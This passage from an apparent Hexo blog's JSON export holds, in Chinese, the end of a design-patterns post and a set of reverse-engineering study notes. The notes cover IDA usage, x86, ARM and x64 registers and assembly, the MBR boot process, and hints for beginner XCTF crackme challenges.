对于复杂文法难以维护。在解释器模式中，每一条规则至少需要定义一个类，因此如果一个语言包含太多文法规则，类的个数将会急剧增加，导致系统难以管理和维护，此时可以考虑使用语法分析程序等方式来取代解释器模式。 执行效率较低。由于在解释器模式中使用了大量的循环和递归调用，因此在解释较为复杂的句子时其速度很慢，而且代码的调试过程也比较麻烦。 11.迭代器模式 迭代器模式(Iterator Pattern)：提供一种方法来访问聚合对象，而不用暴露这个对象的内部表示，其别名为游标(Cursor)。迭代器模式是一种对象行为型模式。 举例：迭代器帮助请求方获取数据，避免直接操作数据聚合类，使数据聚合类专注存储数据。具体应用有分页等功能，分页功能的迭代器将专门负责操作分页数据，将操作逻辑和数据源分离。 优点： 它支持以不同的方式遍历一个聚合对象，在同一个聚合对象上可以定义多种遍历方式。在迭代器模式中只需要用一个不同的迭代器来替换原有迭代器即可改变遍历算法，我们也可以自己定义迭代器的子类以支持新的遍历方式。 迭代器简化了聚合类。由于引入了迭代器，在原有的聚合对象中不需要再自行提供数据遍历等方法，这样可以简化聚合类的设计。 在迭代器模式中，由于引入了抽象层，增加新的聚合类和迭代器类都很方便，无须修改原有代码，满足“开闭原则”的要求。 缺点： 由于迭代器模式将存储数据和遍历数据的职责分离，增加新的聚合类需要对应增加新的迭代器类，类的个数成对增加，这在一定程度上增加了系统的复杂性。 抽象迭代器的设计难度较大，需要充分考虑到系统将来的扩展，例如JDK内置迭代器Iterator就无法实现逆向遍历，如果需要实现逆向遍历，只能通过其子类ListIterator等来实现，而ListIterator迭代器无法用于操作Set类型的聚合对象。在自定义迭代器时，创建一个考虑全面的抽象迭代器并不是件很容易的事情。","link":"/2022/04/21/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"},{"title":"逆向工程学习笔记","text":"摘要：本文记录了学习逆向的过程 前言 一.前置知识1.什么是逆向1234一般的编译：高级语言-&gt;汇编-&gt;机器码逆向：机器码-&gt;汇编-&gt;源代码(高级语言)从源代码理解开发者行为与目的狭义的逆向：利用工具对源代码及二进制文件进行逆向分析 2.逆向工具 提前要记住IDA的基操~~ 123451.shift+F12 查看string信息 (通常可以看到重要的信息 )2.Alt + T 查找带有目标字符串的函数3. F5 查看 C代码4. Ctrl + F 在函数框中 搜索函数5. 空格键 流程图与代码 来回切换 3.逆向流程拿到程序-&gt;die看有没有壳，有的话脱壳-&gt;静态或动态分析 4.其他PE和ELFPE（Portable Executable）意为可移植的可执行的文件，常见的EXE、DLL、OCX、SYS、COM都是PE格式文件，即Windows操作系统上的程序文件（可能是间接被执行，如DLL） ELF（Executable and Linkable Format）意为可执行与可链接格式，一种用于二进制文件、可执行文件、目标代码、共享库和核心转储格式文件，是UNIX系统实验室（USL）作为应用程序二进制接口（Application Binary Interface，ABI）而开发和发布的，也是Linux的主要可执行文件格式。 x86和x64的区别x86中只有8个32位通用寄存器，eax,ebx,ecx，edx, ebp, esp, esi, edi。x86_64把这8个通用寄存器扩展成了64位的，并且比x86增加了若干个寄存器（增加了8个，变成了总共16个通用寄存器） AT&amp;T和IntelAT&amp;T 语法，源在目标之前，而在英特尔语法中，目标在源之前 二、从零开始学逆向x861.恶意软件的类型后门是一种将自身嵌入到计算机中的恶意代码，允许远程攻击者在很少或有时没有权限的情况下访问任何相应的本地计算机上的各种命令。 僵尸网络:攻击者通过各种途径传播僵尸程序感染互联网上的大量主机，而被感染的主机将通过一个控制信道接收攻击者的指令，从而在控制者和被感染主机之间所形成的一个可一对多控制的网络。僵尸网络为 DDoS 攻击提供了所需的“火力”带宽和计算机以及管理攻击所需的基础架构。“控制服务器（Control Server）”是指控制和通信的中心服务器 下载器(downloader):是恶意代码，其目的只有一个，即安装其他恶意软件。当黑客最初获得对系统的访问权限时，经常会安装下载器。然后下载器安装额外的软件来控制系统 信息访问恶意软件:从计算机收集信息并将其直接发送到主机，例如键盘记录器或密码抓取器，通常用于获取对可能非常敏感的各种在线帐户的访问权限 Rootkit:向用户隐藏自身的存在和其他恶意软件，使其极难定位。可以操纵进程，例如在 IP 扫描中隐藏其 IP，这样用户可能永远不会知道他们拥有连接到僵尸网络或其他远程计算机的直接套接字。 蠕虫：它会自我复制并追踪其他计算机。 2.x86 程序集介绍关注 32 位架构，因为最终大多数恶意软件都将为此编写，以便感染尽可能多的系统。32 位应用程序/恶意软件将在 64 位系统上运行。 专注于 Linux 和基于控制台的编程，因为大多数专业服务器都使用 Linux，因此是恶意软件的最大威胁。 3.十六进制数系统我们在二进制中了解到每个数字代表一个位。如果我们组合 8 位，我们得到一个字节。一个字节可以进一步细分为高 4 位和低 4 位。由于 4 位为您提供了从 0 到 15 的可能范围，因此基数为 16 的数字系统更易于使用。 在 x86 汇编中，用十六进制表示二进制数字表示比在任何其他数字系统中都容易得多。重要的是要了解每个十六进制数都是 4 位长或称为半字节 十六进制的加法如下。从这一点开始，所有十六进制数字将在数字旁边有一个“h”： 4.字节、字、双字一个字节是 8 位。两个字节称为一个字，两个字称为一个双字，它是四个字节（32 位），一个四字是八个字节（64 位）。 一个字节是 8 位。大小为 8 位的二进制数的数量是从 0 开始到 255 的 256 个值之一。0xffffd040 是 4 个字节并且是一个双字。(每个十六进制数字都是 4 位长) 5.x86 基本架构 CPU由4部分组成： 获取指令：32 位 CPU 首先从内存中的特定地址获取一个双字，然后从内存中读取并加载到 CPU 中。此时，CPU 查看双字中的二进制位模式，并开始执行获取的机器指令指示它执行的过程。 在执行完一条指令后，CPU 会进入内存并按顺序取出下一条机器指令。CPU 有一个寄存器，称为 EIP 或指令指针，它包含要从内存中获取并执行的下一条指令的地址 如果我们控制 EIP 的流程，我们可以改变程序来做它不打算做的事情。这是恶意软件运行的一种流行技术。 6.通用寄存器通用寄存器可用于保存任何类型的数据，这些数据在程序中已获得特定用途 12345678EAX : 算术计算中使用的主寄存器。也称为累加器，因为它保存算术运算的结果和函数返回值。EBX：基址寄存器。指向 DS 段中数据的指针。用于存放程序的基地址。ECX：计数器寄存器通常用于保存一个值，该值表示一个进程要重复的次数。用于循环和字符串操作。EDX：通用寄存器。另外用于 I/O 操作。此外将 EAX 扩展到 64 位。ESI：源索引寄存器。指向 DS 寄存器所指向的段中的数据的指针。用作字符串和数组操作中的偏移地址。它保存从哪里读取数据的地址。EDI：目标索引寄存器。指向由 ES 寄存器指向的段中的数据（或目标）的指针。用作字符串和数组操作中的偏移地址。它保存所有字符串操作的隐含写入地址。EBP：基指针。指向堆栈上数据的指针（在 SS 段中）。它指向当前堆栈帧的底部。它用于引用局部变量。ESP：堆栈指针（在 SS 段中）。它指向当前堆栈帧的顶部。它用于引用局部变量。 EAX、EBX、ECX 和 EDX 寄存器的低 2 个字节中的每一个都可以由 AX 引用，然后按名称细分为 AH、BH、CH 和 DH 用于高字节，AL、BL、CL 和 DL 用于低字节每个 1 个字节。此外，ESI、EDI、EBP 和 ESP 可以通过它们的 16 位等效项来引用，即 SI、DI、BP、SP。 7.段寄存器123456CS：代码段寄存器存储用于数据访问的代码段（.text 段）的基本位置。DS：数据段寄存器存储用于数据访问的变量（.data 部分）的默认位置。ES：在字符串操作期间使用的额外段寄存器。SS：堆栈段寄存器存储堆栈段的基址，在隐式使用堆栈指针或显式使用基址指针时使用。FS：额外段寄存器。GS：额外的段寄存器。 每个段寄存器都是 16 位的，包含指向内存特定段开始的指针。CS 寄存器包含指向内存中代码段的指针。代码段是指令代码存储在内存中的位置。处理器根据 CS 寄存器值和指令指针 (EIP)寄存器中包含的偏移值从内存中检索指令代码。请记住，没有程序可以显式加载或更改 CS 寄存器。当程序被分配一个内存空间时，处理器分配它的值。 DS、ES、FS 和 GS 段寄存器都是用来指向数据段的。四个单独的数据段中的每一个都帮助程序分离数据元素，以确保它们不重叠。程序使用段的适当指针值加载数据段寄存器，然后使用偏移值引用各个内存位置。 段寄存器被认为是操作系统的一部分，几乎在所有情况下都不能直接读取或更改。在保护模式平面模型（32 位的 x86 架构）中工作时，您的程序运行并接收 4GB 地址空间，任何 32 位寄存器都可以潜在地寻址 40 亿个内存位置中的任何一个，但定义的那些受保护区域除外 物理内存可能大于 4GB，但是 32 位寄存器只能表示 4,294,967,296 个不同的位置。如果您的计算机中有超过 4GB 的内存，则操作系统必须在内存中安排一个 4GB 区域 8.EIP寄存器默认情况时,gdb和gcc输出的汇编都是AT&amp;T格式的,但是它们都有方式转换为Intel格式 9.指令代码处理 在最左边，我们有相应的内存地址。在中间我们有操作码，最后在右边我们有相应的英特尔语法汇编语言。 检查内存地址80483de，我们在其中看到操作码b8 00 00 00 00。我们可以看到b8操作码对应右边的mov eax, 0x0指令。下一系列 00 00 00 00 代表值 0 的 4 个字节。我们看到mov eax, 0x0因此将 0 的值移动到 eax 中，因此代表上面的代码。请记住，IA-32 平台使用我们所谓的小端表示法。 假设有一个int类型的变量，位于地址0x200处，它的十六进制值为0x1234567812是最高有效位，78是最低有效位 小端表示法： 120x200 0x201 0x202 0x20378 56 34 12 10.如何编译程序.c-&gt;.s(汇编语言源代码)-&gt;.o(二进制对象文件)-&gt;链接器生成二进制可执行文件 11.内核空间与用户空间在 Linux 中，有两个不同的内存区域。在任何程序执行的内存的最底部，我们都有内核空间，它由调度程序部分和向量表组成。 在任何程序执行的内存的最顶端，我们都有用户空间，它由堆栈、堆和最后的代码组成 12.寄存器寻址[bx+idata] 13.cmov条件传送指令12cmp %rsi, %rdicmova %rdx, %rax 如果RSI寄存器中的值大于RDI寄存器中的值，则把RAX寄存器中的值替换为RDX寄存器中的值。(at&amp;t) ARM321.二进制加减法 2.字长这是我们的第一个字： 12345670x000000000x000000040x000000080x0000000Cstr, r9, [r4] @ 将 r9 的内容存储到 r4 中的位置，如果 r9 有 0x02 十六进制， 0x02 将被存储到位置 r4 3.寄存器 4.CPSR寄存器(当前程序状态寄存器)该寄存器共有 32 位。我们最关心的最高 4 个是： 1234位 31 – N = 负标志位 30 – Z = 零标志位 29 – C = 进位标志（无符号操作）位 28 – V = 溢出标志（签名操作） 5.链接寄存器链接寄存器 R14 用于保存函数调用的返回地址。 当 BL（带链接的分支）指令执行子程序调用时，链接寄存器设置为子程序返回地址。BL 跳转到代码中的另一个位置，完成后允许返回到 BL 代码部分之后的点。当子程序返回时，链接寄存器将地址返回给程序计数器。 链接寄存器不需要对包含堆栈的内存进行读写操作，通过重复调用小子程序可以节省相当多的执行时间。 当 BL 执行后，返回地址，即下一条要执行的指令的地址，被加载到 LR 或 R14链接寄存器 中。当子例程完成时，LR 被直接复制到 PC（程序计数器）或 R15 并且代码继续执行它在顺序代码源中的先前位置。 6.ARM 固件引导过程第一次打开 Raspberry Pi 设备时会发生什么。 一旦 Pi 通电，图形处理器就会首先运行，因为处理器处于复位状态，GPU 开始执行代码。ROM 从 SD 卡读取并读取bootcode.bin，然后将其加载到 C2 缓存中的内存中，然后打开 RAM 的其余部分，然后再加载start.elf 。 start.elf是图形处理器的操作系统，它读取您可以修改的config.txt 。然后kernel.img被加载到内存中的0x8000中，这是 Linux 内核。 加载后，kernel.img打开 CPU 并开始在内存中的0x8000处运行。 如果需要，我们可以创建自己的kernel.img，我们可以将机器代码硬编码到文件中并替换原始映像，然后重新启动。请记住，ARM 字长为 32 位，从位 0 到 31,如编写以下内容： 1FE FF FF EA 当 Pi 启动时，以下代码在到达kernel.img时会加载以下内容： 12345FE FF FF EA@ 地址 0x8000, 0xfe 被加载。@ 地址 0x8001, 0xff 被加载。@ 地址 0x8002, 0xff 被加载。@ 地址 0x8003, 0xea 被加载。 1234567上面的代码有 3 个部分：(小端输入法从右往左读)1）有条件的 - 设置为始终2）操作码 - 分支3）偏移量——在当前位置内移动多远条件 – 位 31-28：0xe 或 1110操作码 – 位 27-24：0xa 或 1010偏移量 - 位 23-0 -2 7.冯诺依曼架构这种架构的 CPU 芯片包含一个控制单元和算术逻辑单元（以及一些本地存储器） ARM 是一种加载和存储机器，算术逻辑单元仅对寄存器本身和任何需要存储到 RAM 的数据进行操作，控制单元在内存和共享同一数据总线的寄存器之间移动数据。 8.加减法ADDS 与 ADD 相同，只是它在 CPSR 中相应地设置标志。 我们将 100十进制加到r1中，将4,294,967,295加到r2中。然后我们将 r1和r2添加到r0 中。 我们看到10 hex的CPSR。二进制中的10 hex是00010000。0001意味着： 1234未设置负标志零标志未设置进位标志未设置溢出标志集 注意：上面的代码中没有设置溢出标志的任何内容，但是在执行此二进制文件时它处于自然状态(1)。我们看到64 十六进制或100 十进制按预期移动到r1中。CPSR没有变化。加法r0中的值是十进制100和十进制4294967295加在一起后的十进制99 。这怎么可能？加法中溢出了r0的 32 位寄存器。如果我们检查CPSR，我们现在会看到20000010 hex或0010 0000 0000 0000 0000 0000 0001 0000 binary。我们只需要关注最重要的位0010 1234未设置负标志零标志未设置进位标志设置//执行adds后从0001-&gt;0010溢出标志未设置 设置了进位标志并且没有设置溢出标志。这是为什么？ 进位标志是两个无符号数相加并且结果大于保存它的寄存器时设置的标志。我们正在处理一个 32 位寄存器。我们也在处理无符号数，因此设置了CF并且OF未设置，因为OF​​ 标志处理的是有符号数。 砰！我们破解了它，看到r0是101，因此没有触发进位标志，并将CPSR保持在0x10 十六进制，这意味着0001 二进制 注意：有符号运算表示范围：$-2^{n-1} 到 2^{n-1}-1$无符号运算表示范围：$0 到 2^{n}-1$ ADC 与 ADD 相同，只是如果设置了进位标志(即此时CPSR的第29位为1)，结果会加 1。所以当我们使用 ADC 时，我们需要特别注意 CPSR 或状态寄存器。 好的，所以我们在r3和r4中将100 个十进制数和100 个十进制数相加，我们在r5中得到201个十进制数！有什么东西坏了吗？ADC 与 ADD 相同，只是之前adds r0,r1,r2使得进位标志被设置，所以我们在r5中得到了额外的 1 。 ARM中的减法有四个指令，分别是SUB、SBC、RSB和RSC。当您在每个末尾添加 S 后缀时，例如 SUBS、SBCS、RSBS、RSCS，它会影响标志。 9.编译原理编译过程是将 C++ 代码翻译成机器代码的地方。编译将我们的文本文件获取为 cpp 文件并将其转换为称为 obj 文件的中间格式(二进制生成文件)。创建一个抽象语法树，它是常量数据、变量和指令的转换。创建树后，将生成代码。这意味着我们现在有了 ARM CPU 将执行的机器代码。每个 cpp 文件（翻译单元）都将有自己的相应 obj 文件与之关联。 编译之后是链接生成二进制可执行文件，除了 C++ 标准库之外，链接还需要我们的 obj 文件、我们的编译文件，并找到每个符号和函数的位置，并将它们全部链接到一个可执行文件中。 x641.调用约定__fastcall 调用约定指定函数的参数将在可能的情况下在寄存器中传递。符号 (@) 是名称的前缀；参数列表中后跟字节数（十进制）的@符号作为名称的后缀。 如果您有五个要传递的参数，例如 int a， int b， int c， int d， int e并且它是一个 WORD 长度，a将进入cx，b进入dx，c进入r8w，d进入 r9w 和e 入栈。 2.指针123mov rax, 0x10 //rax = 0x10mov rbx, word ptr [rax] //rbx = *rax ,获取地址所引用的对象时mov word ptr [rax], 0x66 //*(0x10) = 0x66 假设内存0x10内的值是0x20 ，因此rax指向0x10内的值，当您通过[rax]引用时，rbx值为0x20。将0x66的值放入0x10的内存位置。原来0x10内存位置内的值是0x20，因此内存内 0x10 处的新值将是0x66。 1lea rbx, my_var //rbx = &amp;(my_var),rbx是一个地址 3.加载有效地址在 C++ 中，一个指针实际上添加了用户在某些内容增加时会看到的内容，但是它实际上是在引擎盖下将其向前移动 2 个字节，假设它是一个字长或 16 位或 2 个字节。一样。 在汇编中，每个字节都是可寻址的。例如： 123lea rax, my_varinc raxmov word ptr [rax], rbx 假设0x20的值在rbx中。上述指令会将0x20的值放入非字边界，这将导致错误。您必须将rax增加 2 以确保不会发生这种情况。 4.数据段数据段在内存中的堆而不是堆栈上分配内存，因为它们不是局部变量，它们在整个二进制文件中都是已知的。 1234567891)byte - 我们使用显然是 1 字节或 8 位的 db 表示法。2)word - 我们使用 dw，长度为 2 个字节。3）双字 - 我们使用 dd 来分配，它们有 4 个字节长。4）四字 - 我们使用 8 字节长的 dq。5)xmm word - 我们使用 16 字节长的 xmmword。6)ymm word - 我们使用 32 字节长的 ymmword。有一些与 CPU 分开的 SSE 数学寄存器，它们保存以下内容：1)real4 - 这是一个单数或您认为的浮点数，因为它有 4 个字节长。2)real8 - 这是一个双浮点，因为它有 8 个字节长。 5.SHL,SHR,ROL,ROR指令6.汇编的编译 123mov ax,0x0001mov bx,0x0002add ax,bx ;result is in ax 注意小端表示法 机器会自动选择较优的指令(即占用字节空间较小的) 因为d位(默认)是0即r/m是目标操作数ax。 汇编代码编译成机器码，注意汇编指令和CPU机器指令不完全对应，因为汇编语言有很多伪指令(比如一条指令机器会拆分成几个步骤)。伪指令是编译器定义的，是编译器对机器指令的封装 7.计算机的启动过程CPU随着时钟信号，从内存中读取指令 按下电源键时，电源给主板供电，CPU会收到一个复位信号，大部分寄存器清零，但代码段寄存器CS会被初始化为0xFFFF,同时指令指针寄存器IP初始化为0x0000。实模式下CPU的寻址方式是把CS的值左移4位即0xFFFF0,再加上IP的值，构成一个20位的物理地址0xFFFF0,这个地址指向主板上的一块特殊的芯片(BIOS芯片)BIOS(基础输入输出系统),是一段固化在芯片中的程序。CPU初始化后执行的第一条指令就来自这里。功能主要是对硬件进行诊断和检测，如判断主板上是否安装了内存条、硬盘、显卡等，并初始化这些设备，当检测到重要设备缺失时，BIOS程序将在屏幕上显示提示信息。(蜂鸣器也会根据不同错误发出声音)检测正常后BIOS最后做的是从外部存储设备读取更多的指令交给CPU执行(如硬盘等) 8.引导扇区BIOS从硬盘上的主引导扇区加载一段程序到内存的固定位置交给CPU执行，操作系统就是由这段程序加载进内存里形成指令的(如安装操作系统的硬盘、U盘、光盘等)，加载成功就形成了windows开机界面啦 我们要做的就是在计算机启动的过程中找一个位置把我们自己的程序塞进去让CPU执行。启动过程中CPU首先执行BIOS程序(主板出厂时已经固化好了，我们很难修改它)，然后就是位于硬盘的主引导扇区了，硬盘的数据我们是可以修改的。如果我们把自己的程序放进主引导扇区再由bios载入内存，就可以执行了。这也是在不用操作系统的情况下让我们的程序运行起来的唯一方法。 主引导扇区位于硬盘什么位置呢？传统的机械硬盘由盘片、磁头和硬盘驱动器组成。盘片用涂有磁介质的铝合金组成，比采用塑料介质的软盘硬很多，所以叫硬盘。盘片被安装在高速转机上旋转(笔记本会慢些)，磁头负责在盘面上读写信息。 每个磁道又被划分为多个扇区，每个扇区通常是512个字节(4096),一个磁道通常划分为63个扇区，扇区是硬盘上组织数据的最小单位，因为内圈磁道周长比外圈小，但划分的扇区数和每个扇区的字节数都一样，所以外圈磁道的扇区存储数据的密度比内圈扇区低 为了在盘片上定位数据，磁道和扇区有编号 硬盘的横截面：一个硬盘由多个盘片组成，盘片的上下两面都有一个磁头，这些磁头固定在同一个轴上，所以磁头号和盘面号是一个意思。磁头在写入数据时并不是把一个盘片的一个面写满再去写下个面的，因为移动磁头来切换磁道的速度比读写的速度慢得多。硬盘是先写满0面的0磁道，再写1面的0磁道，这样纵向地组织数据的。所以不同盘面的相同磁道可以抽象地看成是一个柱面。 如果我们知道一段数据在硬盘上的柱面号、扇区号和磁头号，就可以在硬盘上定位到这段数据。这就是硬盘的CHS寻址方式 9.主引导记录(Master Boot Record,MBR)主引导扇区是位于硬盘的0柱(0道)、0面、1扇区的512字节存储空间，而MBR则为我们要写入的这512个字节的数据。而这512个字节是有严格的格式规范的。1个地址代表1个字节的数据 注意：标志位55AA必不可少，因为不是所有硬盘的0柱0面1扇区都是用来作为主引导扇区的，只有以55AA结尾的BIOS程序才会把主引导扇区的数据识别为MBR载入内存 10.VHD虚拟硬盘VHD是微软定义的一种虚拟硬盘文件。 LBA(逻辑区块寻址，Logical Block Address):CHS寻址方式比较麻烦，而且出现了固态硬盘，根本不存在柱面磁头和扇区 对于固定大小的VHD文件分成两个部分：数据区和尾部。数据区的结构和物理磁盘相同，即数据区扇区和虚拟硬盘扇区顺序映射。所以VHD虚拟硬盘的主引导扇区就是文件的头512字节。我们只需把写好的程序放入VHD文件的头512个字节即可。 三、实战题目XCTF1.ignite me拿到exe文件，放到die中脱壳，发现是exe32为程序，所以放到32位的IDA中， 2.入门逆向这里看到v2和v59这就证明了这是两个数组的运算，所以我们应该将上面的字符串分成两个数组，分别从v2和v59开始 0x13u的u表示无符号数 3.logmein从伪代码我们可以看到，解密所需要的密钥（v7）应该是字符串，但这里v7是LL型的（长长整形），所以在解密之前需要先将v7还原为字符。 这里转换并不复杂，只需将v7的值转换为hex（16进制）然后再转换为字符串，但由于字符是小端存储，所以转换成字符串后还需对字符串做倒置处理。 4.insanity注意字符串地址(cout有自动识别和转换机制)(&amp;str会编译成&amp;str[0]) 发现一个关键的字符串，&amp;strs,发现是取这个字符串输出，然后，跟进strs 5.python-trade步骤：EXE文件转pyc(py2exe:unpy2exe,pyinstall:pyinstxtractor)-&gt;检查前8字节是否是03 f3 0d 0a 76 ed db 57若不是要补上-&gt;pyc转py(uncompyle2) 1python C:\\anaconda3\\envs\\p2\\Scripts\\uncompyle2 aaa.pyc&gt;aaa.py ord() expected string of length 1, but int found 在python3下运行会出错而python2不会，原因是因为ord()这个函数接受的类型是一个长度为1的字符串，而在python3当中传入的i已经是一个整型数了，直接用i-16就可以完成操作 6.re1123memset()//作用是将某一块内存中的内容全部设置为指定的值memset(首地址,值,sizeof(地址总大小));memset(a,0,sizeof(a)) //初始化数组a为0 看看哪里涉及v5，可以看到开头的_mm_storeu_si128(），对其进行分析发现它类似于memset(),将xmmword_413E34的值赋值给v5，所以，我们可以得到正确的flag应该在xmmword_413E34中，然后，我们双击413E34进行跟进 这时，我们使用IDA的另一个功能 R ，能够将十六进制的数转换为字符串。(注意小端读取) 解法二：ODB中文搜索ASCII 解法三：ODB调试，发现判断时有个寄存器写入了flag,复制所有寄存器到剪贴板即可 7.Hello, CTF 四、遇到的问题1.反编译时positive sp value has been found栈sp不平衡，在options-&gt;General-&gt;Disassembly显示栈指针，然后发现提示的语句有负值(显示为负，实际为正，即实际中栈指针ESP不能为正值)，修改上一条语句直至提示的语句的栈指针显示为正值 五、other1.函数调用 我们将常量标签的内存地址移动到 edi 中，并将立即数 25 decimal 移动到数组的第二个索引中。这本质上是一个源代码破解，因为我们将原始值 8 更改为 25。 注意，一个数组的元素占据4个字节，地址+4 2.加壳即真正的源代码被加密了，执行时先执行一段植入的代码对原始代码进行解密，然后才执行源代码总结 参考资料","link":"/2022/04/19/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Signal and System","slug":"Signal-and-System","link":"/tags/Signal-and-System/"},{"name":"FFT","slug":"FFT","link":"/tags/FFT/"},{"name":"Hexo","slug":"Hexo","link":"/tags/Hexo/"},{"name":"Icarus","slug":"Icarus","link":"/tags/Icarus/"},{"name":"Blog","slug":"Blog","link":"/tags/Blog/"},{"name":"Github","slug":"Github","link":"/tags/Github/"},{"name":"https","slug":"https","link":"/tags/https/"},{"name":"kali","slug":"kali","link":"/tags/kali/"},{"name":"vmware","slug":"vmware","link":"/tags/vmware/"},{"name":"cookie","slug":"cookie","link":"/tags/cookie/"},{"name":"head response","slug":"head-response","link":"/tags/head-response/"},{"name":"http","slug":"http","link":"/tags/http/"},{"name":"python","slug":"python","link":"/tags/python/"},{"name":"robots协议","slug":"robots协议","link":"/tags/robots%E5%8D%8F%E8%AE%AE/"},{"name":"spider","slug":"spider","link":"/tags/spider/"},{"name":"url","slug":"url","link":"/tags/url/"},{"name":"security","slug":"security","link":"/tags/security/"},{"name":"sql注入","slug":"sql注入","link":"/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"splmap","slug":"splmap","link":"/tags/splmap/"},{"name":"algorithm","slug":"algorithm","link":"/tags/algorithm/"},{"name":"acwing","slug":"acwing","link":"/tags/acwing/"},{"name":"C++","slug":"C","link":"/tags/C/"},{"name":"CSRF","slug":"CSRF","link":"/tags/CSRF/"},{"name":"metasploit","slug":"metasploit","link":"/tags/metasploit/"},{"name":"trojan","slug":"trojan","link":"/tags/trojan/"},{"name":"sql","slug":"sql","link":"/tags/sql/"},{"name":"redis","slug":"redis","link":"/tags/redis/"},{"name":"proxypool","slug":"proxypool","link":"/tags/proxypool/"},{"name":"tor","slug":"tor","link":"/tags/tor/"},{"name":"socks5","slug":"socks5","link":"/tags/socks5/"},{"name":"object-oriented","slug":"object-oriented","link":"/tags/object-oriented/"},{"name":"reverse","slug":"reverse","link":"/tags/reverse/"},{"name":"pwn","slug":"pwn","link":"/tags/pwn/"}],"categories":[{"name":"EE","slug":"EE","link":"/categories/EE/"},{"name":"CS","slug":"CS","link":"/categories/CS/"},{"name":"Signal and System","slug":"EE/Signal-and-System","link":"/categories/EE/Signal-and-System/"},{"name":"Blog","slug":"CS/Blog","link":"/categories/CS/Blog/"},{"name":"security","slug":"CS/security","link":"/categories/CS/security/"},{"name":"algorithm","slug":"CS/algorithm","link":"/categories/CS/algorithm/"}]}